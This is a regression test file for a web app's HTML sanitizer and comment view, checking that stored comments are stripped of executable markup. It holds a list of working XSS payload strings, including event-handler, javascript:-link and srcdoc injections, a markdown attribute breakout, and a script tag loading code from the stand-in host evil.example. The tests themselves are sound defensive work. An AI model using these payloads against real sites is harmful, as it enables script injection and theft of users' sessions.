// @vitest-environment jsdom
import { describe, it, expect, vi, afterEach } from 'vitest';
import { render, cleanup } from '@testing-library/react';

/**
 * Regression tests for the beacon HTML sanitizer and the comment view.
 * The old regex blocklist only stripped `<script>...</script>` pairs, QUOTED
 * `on*="..."` handlers and quoted `javascript:` hrefs, and the comment view
 * skipped the sanitizer entirely whenever the server sent body_html.
 */

const { commentsState, mutation } = vi.hoisted(() => ({
  commentsState: { current: [] as unknown[] },
  mutation: () => ({ mutate: () => {}, isPending: false }),
}));

vi.mock('@/hooks/use-comments', () => ({
  useBeaconComments: () => ({ data: commentsState.current, isLoading: false, error: null }),
  useCreateBeaconComment: mutation,
  useDeleteBeaconComment: mutation,
}));
vi.mock('@bigbluebam/ui/use-can', () => ({ useCan: () => false }));
vi.mock('@/stores/auth.store', () => ({
  useAuthStore: (sel: (s: { user: { id: string } }) => unknown) => sel({ user: { id: 'viewer' } }),
}));

import { CommentsSection } from '../src/components/beacon/comments-section';
import { markdownToHtml, sanitizeHtml } from '../src/lib/markdown';

const EXECUTABLE_TAGS = new Set(['script', 'iframe', 'object', 'embed', 'frame', 'frameset', 'base', 'meta']);
const URL_ATTRS = ['href', 'src', 'xlink:href', 'action', 'formaction', 'data'];

function executableFeatures(root: ParentNode): string[] {
  const found: string[] = [];
  for (const el of Array.from(root.querySelectorAll('*'))) {
    const tag = el.tagName.toLowerCase();
    if (EXECUTABLE_TAGS.has(tag)) found.push(`<${tag}>`);
    for (const attr of Array.from(el.attributes)) {
      const name = attr.name.toLowerCase();
      if (name.startsWith('on')) found.push(`${tag}[${name}]`);
      if (name === 'srcdoc') found.push(`${tag}[srcdoc]`);
      if (URL_ATTRS.includes(name) && /^\s*javascript:/i.test(attr.value)) {
        found.push(`${tag}[${name}=javascript:]`);
      }
    }
  }
  return found;
}

function parse(html: string): DocumentFragment {
  const tpl = document.createElement('template');
  tpl.innerHTML = html;
  return tpl.content;
}

const PAYLOADS = [
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href=javascript:alert(1)>x</a>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<script/src=//evil.example/x.js>',
  '<details open ontoggle=alert(1)>',
];

afterEach(() => {
  cleanup();
  commentsState.current = [];
});

describe('beacon sanitizeHtml', () => {
  for (const payload of PAYLOADS) {
    it(`neutralizes ${payload}`, () => {
      expect(executableFeatures(parse(sanitizeHtml(payload)))).toEqual([]);
    });
  }

  it('neutralizes an attribute breakout built purely from markdown link syntax', () => {
    const md = '[click](a"/autofocus/onfocus=location=name//)';
    expect(executableFeatures(parse(sanitizeHtml(markdownToHtml(md))))).toEqual([]);
  });

  it('keeps normal markdown formatting, links, and code', () => {
    const md = [
      '## Heading',
      '**bold** and *italic* and `inline`',
      '[docs](https://example.com/help)',
      '- item one',
      '```',
      'const x = 1;',
      '```',
    ].join('\n');
    const root = parse(sanitizeHtml(markdownToHtml(md)));
    expect(root.querySelector('h2')?.textContent).toBe('Heading');
    expect(root.querySelector('strong')?.textContent).toBe('bold');
    expect(root.querySelector('em')?.textContent).toBe('italic');
    expect(root.querySelector('code.rich-text-inline-code')?.textContent).toBe('inline');
    expect(root.querySelector('pre.rich-text-code-block code')?.textContent).toBe('const x = 1;');
    expect(root.querySelector('ul li')?.textContent).toBe('item one');
    const link = root.querySelector('a.rich-text-link');
    expect(link?.getAttribute('href')).toBe('https://example.com/help');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
  });
});

describe('beacon CommentsSection', () => {
  const baseComment = {
    id: 'c1',
    beacon_id: 'b1',
    parent_id: null,
    author_id: 'author',
    body_markdown: 'fallback',
    created_at: '2026-01-01T00:00:00Z',
    updated_at: '2026-01-01T00:00:00Z',
    author_name: 'Gilligan',
    author_email: null,
    author_avatar_url: null,
  };

  it('sanitizes server-provided body_html, not only the markdown fallback', () => {
    commentsState.current = [
      { ...baseComment, body_html: `<p>stored <strong>ok</strong></p>${PAYLOADS.join('')}` },
    ];
    const { container } = render(<CommentsSection beaconId="b1" />);
    const body = container.querySelector('.prose');
    if (!body) throw new Error('comment body not rendered');
    expect(executableFeatures(body)).toEqual([]);
    expect(body.querySelector('strong')?.textContent).toBe('ok');
  });

  it('still renders the markdown fallback when body_html is null', () => {
    commentsState.current = [{ ...baseComment, body_html: null, body_markdown: '**bold** text' }];
    const { container } = render(<CommentsSection beaconId="b1" />);
    const body = container.querySelector('.prose');
    expect(body?.querySelector('strong')?.textContent).toBe('bold');
  });
});
